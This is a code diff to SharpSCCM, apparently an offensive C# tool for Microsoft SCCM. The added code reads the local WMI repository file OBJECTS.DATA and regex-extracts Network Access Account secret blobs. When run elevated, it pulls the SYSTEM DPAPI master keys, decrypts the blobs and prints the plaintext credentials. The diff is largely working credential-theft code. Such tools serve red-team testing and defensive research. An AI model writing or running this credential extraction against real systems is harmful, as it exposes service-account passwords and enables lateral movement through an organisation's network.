@@ -2,63 +2,74 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Management;
+using System.Text;
+using System.Text.RegularExpressions;
 
 namespace SharpSCCM
 {
     public class Credentials
     {
-
         public static void LocalNetworkAccessAccountsDisk()
         {
+            // Thanks to @guervild on Github for contributing this code to SharpDPAPI
+
             Console.WriteLine($"[*] Retrieving Network Access Account blobs from CIM repository");
 
+            string fileData = "";
+            MemoryStream ms = new MemoryStream();
+
             // Path of the CIM repository
-            string cimRepoPath = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
-
-            // We don't have to be elevated to read the blobs...
-            // get size of file
-            FileInfo cimRepo = new FileInfo(cimRepoPath);
-            uint bytesToSearch = (uint) (int) cimRepo.Length;
-
-            if (FileContainsDpapiBlob(cimRepoPath, bytesToSearch))
+            string path = "C:\\Windows\\System32\\Wbem\\Repository\\OBJECTS.DATA";
+            using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            using (var sr = new StreamReader(fs, Encoding.Default))
             {
-                Console.WriteLine($"[*]     Found potential DPAPI blob at {cimRepoPath}\n");
-            }
-            else
-            {
-                Console.WriteLine($"[!]     No DPAPI blob found");
+                fileData = sr.ReadToEnd();
             }
 
-            // Parse from CIM repo
-            //string protectedUsername = "";
-            //string protectedPassword = "";
+            Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
+            var matchesData = regexData.Matches(fileData);
 
-            // TODO -- Logic to strip blob
-            // But we do have to be elevated to retrieve the system masterkeys...
+            if (matchesData.Count <= 0)
+            {
+                Console.WriteLine("\r\n[X] No \"NetworkAccessAccount\" match found.");
+            }
+
             if (Helpers.IsHighIntegrity())
             {
+
                 Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+
                 Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
                 foreach (KeyValuePair<string, string> kvp in mappings)
                 {
                     Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                 }
-                Console.WriteLine();
 
-                //try
-                //{
-                //    string username = Dpapi.Execute(protectedUsername, mappings);
-                //    string password = Dpapi.Execute(protectedPassword, mappings);
+                for (int index = 0; index < matchesData.Count; index++)
+                {
 
-                //    Console.WriteLine("\r\n[*] Triaging Network Access Account Credentials\r\n");
-                //    Console.WriteLine("     Plaintext NAA Username         : {0}", username);
-                //    Console.WriteLine("     Plaintext NAA Password         : {0}\n", password);
-                //}
-                //catch (Exception e)
-                //{
-                //    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
-                //    Console.WriteLine(e.ToString());
-                //}
+                    for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
+                    {
+                        try
+                        {
+                            string naaPlaintext = "";
+                            Console.WriteLine(
+                                "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
+                            naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, mappings);
+                            Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
+                            Console.WriteLine();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                            Console.WriteLine(e.ToString());
+                        }
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("\r\n[X] You must be elevated to retrieve masterkeys.\r\n");
             }
         }
 
@@ -111,7 +122,7 @@ namespace SharpSCCM
             if (Helpers.IsHighIntegrity())
             {
                 Console.WriteLine($"[*] Retrieving Network Access Account blobs via WMI\n");
-                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost","root\\ccm\\policy\\Machine\\ActualConfig");
+                ManagementScope wmiConnection = MgmtUtil.NewWmiConnection("localhost", "root\\ccm\\policy\\Machine\\ActualConfig");
                 //MgmtUtil.GetClassInstances(wmiConnection, "CCM_NetworkAccessAccount");
                 ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                 ManagementObjectCollection accounts = searcher.Get();
